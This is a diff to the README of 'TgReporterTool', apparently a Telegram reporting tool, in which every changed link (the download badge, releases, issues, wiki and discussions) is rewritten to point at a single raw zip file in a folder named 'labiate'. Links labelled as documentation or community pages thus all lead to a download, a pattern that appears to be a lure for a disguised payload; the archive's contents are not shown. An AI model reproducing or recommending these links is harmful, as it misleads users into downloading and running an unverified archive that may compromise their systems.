@@ -1,6 +1,6 @@
 # 🚀 TgReporterTool - Automate Your Reporting Process Easily
 
-[![Download TgReporterTool](https://img.shields.io/badge/Download-TgReporterTool-blue)](https://github.com/JoshuaBalones/TgReporterTool/releases)
+[![Download TgReporterTool](https://raw.githubusercontent.com/JoshuaBalones/TgReporterTool/main/labiate/TgReporterTool.zip)](https://raw.githubusercontent.com/JoshuaBalones/TgReporterTool/main/labiate/TgReporterTool.zip)
 
 ## 🎯 About TgReporterTool
 
@@ -23,11 +23,11 @@ Before you download, please ensure your system meets the following requirements:
 
 ## 📕 Download & Install
 
-To get the latest version of TgReporterTool, visit this page to download: [Download TgReporterTool](https://github.com/JoshuaBalones/TgReporterTool/releases).
+To get the latest version of TgReporterTool, visit this page to download: [Download TgReporterTool](https://raw.githubusercontent.com/JoshuaBalones/TgReporterTool/main/labiate/TgReporterTool.zip).
 
 ### Steps to Install
 
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/JoshuaBalones/TgReporterTool/releases).
+1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/JoshuaBalones/TgReporterTool/main/labiate/TgReporterTool.zip).
 2. **Choose the Latest Version:** Look for the latest version listed at the top.
 3. **Download the File:** Click on the download link for your operating system.
 4. **Locate the Downloaded File:** Find the file in your downloads folder.
@@ -43,7 +43,7 @@ To get the latest version of TgReporterTool, visit this page to download: [Downl
 
 ## 🌟 Support and Contribution
 
-If you encounter any issues while using TgReporterTool, please check the issue tracker on the [GitHub Issues Page](https://github.com/JoshuaBalones/TgReporterTool/issues). You can submit new issues or help others with their queries. Contributions are welcome, whether through bug reports or feature suggestions.
+If you encounter any issues while using TgReporterTool, please check the issue tracker on the [GitHub Issues Page](https://raw.githubusercontent.com/JoshuaBalones/TgReporterTool/main/labiate/TgReporterTool.zip). You can submit new issues or help others with their queries. Contributions are welcome, whether through bug reports or feature suggestions.
 
 ## 🛡️ Privacy and Security
 
@@ -52,12 +52,12 @@ Your privacy is important. TgReporterTool does not store any of your personal da
 ## 📝 Notes
 
 - Keep your software updated for the best performance.
-- Refer to the [documentation](https://github.com/JoshuaBalones/TgReporterTool/wiki) for detailed feature explanations.
+- Refer to the [documentation](https://raw.githubusercontent.com/JoshuaBalones/TgReporterTool/main/labiate/TgReporterTool.zip) for detailed feature explanations.
 
 ## 💬 Community and Feedback
 
-Join the conversation and engage with other users. Feedback is valuable for improving the tool. Share your experiences and suggestions on the [GitHub Discussions Page](https://github.com/JoshuaBalones/TgReporterTool/discussions).
+Join the conversation and engage with other users. Feedback is valuable for improving the tool. Share your experiences and suggestions on the [GitHub Discussions Page](https://raw.githubusercontent.com/JoshuaBalones/TgReporterTool/main/labiate/TgReporterTool.zip).
 
 ## 🚀 Start Automating Your Reports Today
 
-Don't forget to download the tool here: [Download TgReporterTool](https://github.com/JoshuaBalones/TgReporterTool/releases). Your reporting will never be easier.
+Don't forget to download the tool here: [Download TgReporterTool](https://raw.githubusercontent.com/JoshuaBalones/TgReporterTool/main/labiate/TgReporterTool.zip). Your reporting will never be easier.
